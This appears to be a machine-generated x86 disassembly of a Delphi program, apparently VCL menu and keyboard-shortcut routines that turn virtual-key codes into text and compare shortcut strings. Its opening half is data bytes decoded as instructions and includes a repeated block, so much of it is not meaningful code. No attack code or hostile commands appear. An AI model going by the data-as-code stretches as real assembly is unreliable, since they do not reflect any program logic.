add [ esi + edx * 2 + 0x43 ] dh
add [ esi + edx * 2 + 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
call 0xffffffffb8434706
xchg esp eax
add eax 0xa070043
push esp
push eax
outsd
jo r-xdata
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x66 ] cl
inc ecx
add al dh
inc ecx
add [ edx + ebp * 2 ] dh
inc ecx
add [ esi + 0x671c0041 ] bl
inc ecx
add al bh
push edi
inc ebx
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
je r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
inc ebx
add [ esi + ebx * 2 + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
inc ecx
add [ esi + ebx * 2 ] bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
cmp eax [ ecx ]
cmp al 0x5e
cmp al [ ecx ]
xor [ eax ] al
add bh bh
cld
push ebp
inc ebx
add [ eax + 0x434e ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
jl r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add al dh
inc eax
outsb
cld
stc
inc edx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
call [ eax ]
push esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
and al 0x99
inc esp
add [ eax ] cl
add bh bh
mov esp 0x1004351
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ ebx ] bh
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
insb
out dx eax
inc ecx
add al dl
out dx eax
inc ecx
add [ eax - 0x63ffbe11 ] dh
out dx eax
inc ecx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x43085090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x43 ] bl
add [ eax ] cl
add [ eax ] al
add [ esi + ebp * 8 ] dh
add bh bh
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + ebp * 8 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
or [ ebx ] al
or [ eax ] al
add [ eax ] al
xor al 0xee
jo r-xdata
inc ebx
push 0x65676e61
insb
cmp eax [ ecx ]
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3065646f
add al 0x43
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
add al 0x43
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add eax 0x1d00043
inc ebx
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
je r-xdata
shl ah 0x7
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
pop es
inc ebx
add [ eax + eax ] dl
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
add eax [ ebx ]
pushad
add [ eax ] al
jmp [ eax ]
mov eax esi
pop edi
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_440d20
mov esi eax
test esi esi
jne r-xdata
pop esi
pop ebx
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_4304f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
add eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ 0x780043 ] al
add [ eax ] al
adc al 0x1
inc ebx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
outsb
jne r-xdata
add [ eax + 0x4400435d ] al
push ecx
inc ebx
add [ eax + 0x47 ] dh
inc ebx
add [ ecx + edx * 2 + 0x43 ] dh
add [ eax ] ch
pop esi
inc ebx
add ah ah
pop esi
inc ebx
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
or eax 0x4303f000
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x57ffbcaa ] bl
push esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
add [ esi + edx * 2 + 0x43 ] dh
add [ esi + edx * 2 + 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax ] bl
aas
inc eax
add ah dh
pop ebp
inc ebx
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add [ ecx + edx * 2 + 0x43 ] bl
add al bh
push ecx
inc ebx
add ah dl
fiadd [ ecx ]
int3
call 0xffffffffb8434706
inc ecx
inc eax
add [ ebx + ebx * 8 ] ah
inc ecx
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
xchg esp eax
add eax 0xa070043
push esp
push eax
outsd
jo r-xdata
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x66 ] cl
inc ecx
add al dh
inc ecx
add [ edx + ebp * 2 ] dh
inc ecx
add [ esi + 0x671c0041 ] bl
inc ecx
add al bh
push edi
inc ebx
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
je r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
inc ebx
add [ esi + ebx * 2 + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
inc ecx
add [ esi + ebx * 2 ] bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
cmp eax [ ecx ]
cmp al 0x5e
cmp al [ ecx ]
xor [ eax ] al
add bh bh
cld
push ebp
inc ebx
add [ eax + 0x434e ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
jl r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add al dh
inc eax
outsb
cld
stc
inc edx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
call [ eax ]
push esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
and al 0x99
inc esp
add [ eax ] cl
add bh bh
mov esp 0x1004351
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ ebx ] bh
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
insb
out dx eax
inc ecx
add al dl
out dx eax
inc ecx
add [ eax - 0x63ffbe11 ] dh
out dx eax
inc ecx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x43085090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x43 ] bl
add [ eax ] cl
add [ eax ] al
add [ esi + ebp * 8 ] dh
add bh bh
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + ebp * 8 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
or [ ebx ] al
or [ eax ] al
add [ eax ] al
xor al 0xee
jo r-xdata
inc ebx
push 0x65676e61
insb
cmp eax [ ecx ]
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3065646f
add al 0x43
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
add al 0x43
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add eax 0x1d00043
inc ebx
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
je r-xdata
shl ah 0x7
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
pop es
inc ebx
add [ eax + eax ] dl
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
add eax [ ebx ]
pushad
add [ eax ] al
jmp [ eax ]
mov eax esi
pop edi
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_440d20
mov esi eax
test esi esi
jne r-xdata
pop esi
pop ebx
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_43089c
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43a67c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_440d20
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_4308f8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
movzx eax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_430930
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404e44
push 0x0
movzx eax [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4050b4
sub_430984
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_430b63
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ebx [ ebp - 0x2 ]
movzx eax bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_404edc
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x41
add edx 0x41
call sub_40502c
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_404edc
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404edc
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x60
add edx 0x30
call sub_40502c
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x30
add edx 0x30
call sub_40502c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404e44
mov eax esi
call sub_404e44
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404edc
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
movzx eax bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_40987c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405170
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x2 ]
call sub_430930
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40512c
lea eax [ ebp - 0x8 ]
add bl 0x4
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_404edc
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40512c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40512c
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40512c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b6a
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404e68
retn
sub_430b7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
mov edx ebx
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
cmp edx eax
jg r-xdata
sub edx 0x4
mov edx [ edx ]
movzx eax [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
test esi esi
je r-xdata
mov eax ebx
call sub_405324
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_405324
mov ecx esi
pop edx
call sub_4093b8
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov [ ebp - 0x5 ] 0x1
mov eax ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx eax
mov eax 0x1
xchg edx eax
call sub_4053c4
sub eax 0x4
mov eax [ eax ]
sub_430c04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_430d27
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x6 ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_430b7c
test al al
je r-xdata
or [ ebp - 0x8 ] 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_430b7c
test al al
je r-xdata
or [ ebp - 0x8 ] 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_430b7c
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_430b7c
test al al
je r-xdata
or [ ebp - 0x8 ] 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or [ ebp - 0x8 ] 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430d2e
lea eax [ ebp - 0x10 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov di 0x8
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax [ ebp - 0xc ]
call sub_405324
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
inc edi
cmp di 0x256
jne r-xdata
or di [ ebp - 0x8 ]
mov [ ebp - 0x6 ] di
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_430984
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub_430d68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_4333e4
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4333f4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_430dcc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_4333e4
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4333e4
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4333f4
movzx eax [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4333f4
movzx eax [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
movzx eax [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_430d68
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_430d68
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4333f4
movzx eax [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4333f4
movzx eax [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_430f1c
push ebx
mov ebx eax
mov eax ebx
call sub_44b9cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_436230
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_430f54
push ebx
mov ebx eax
mov eax ebx
call sub_44b9e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
movzx eax [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_430f84
push ebx
mov ebx eax
mov eax ebx
call sub_44b9f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
movzx eax [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_430fb4
push ebx
mov ebx eax
mov eax ebx
call sub_44ba1c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_430fe4
push ebx
mov ebx eax
mov eax ebx
call sub_44ba44
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_405270
je r-xdata
mov al 0x1
pop ebx
retn
sub_431018
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44ba08
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_431054
push ebx
mov ebx eax
mov eax ebx
call sub_44ba58
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_431088
push ebx
mov ebx eax
mov eax ebx
call sub_44ba6c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
movzx eax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4310bc
push ebx
mov ebx eax
mov eax ebx
call sub_44ba80
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4310f0
push ebx
mov ebx eax
mov eax ebx
call sub_41e368
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_431118
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_431138
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
